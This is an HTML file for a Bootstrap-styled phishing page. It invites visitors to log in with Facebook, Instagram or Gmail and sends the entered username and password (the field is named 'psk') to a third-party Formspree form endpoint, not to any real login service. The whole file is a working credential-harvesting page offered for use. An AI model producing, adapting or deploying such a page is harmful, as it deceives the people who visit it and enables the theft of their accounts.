<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Form</title>
  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <!-- Custom CSS -->
  <style>
    body {
      background-color: #f8f9fa;
    }
    .login-form {
      width: 360px;
      margin: 50px auto;
      padding: 30px;
      background-color: #fff;
      border-radius: 10px;
      box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
    }
    .login-form h2 {
      text-align: center;
      margin-bottom: 30px;
    }
    .form-control {
      height: 50px;
    }
    .btn {
      width: 100%;
      height: 50px;
      border-radius: 25px;
    }
  </style>
</head>
<body>
  
  <div class="login-form">
    <h2>Login with your</h2>
    <i>Facebook|Instagram|Gmail</i>
    <form action="https://formspree.io/f/xvoebgpv" method="POST">
      <div class="form-group">
        <input type="text" name="username" class="form-control" placeholder="Email or Phone Number" required>
      </div>
      <div class="form-group">
        <input type="password" name="psk" class="form-control" placeholder="Password" required>
      </div>
      <button type="submit" class="btn btn-primary">Sign in</button>
    </form>
  </div>

  <!-- Bootstrap JS and dependencies (optional) -->
  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

</body>
</html>
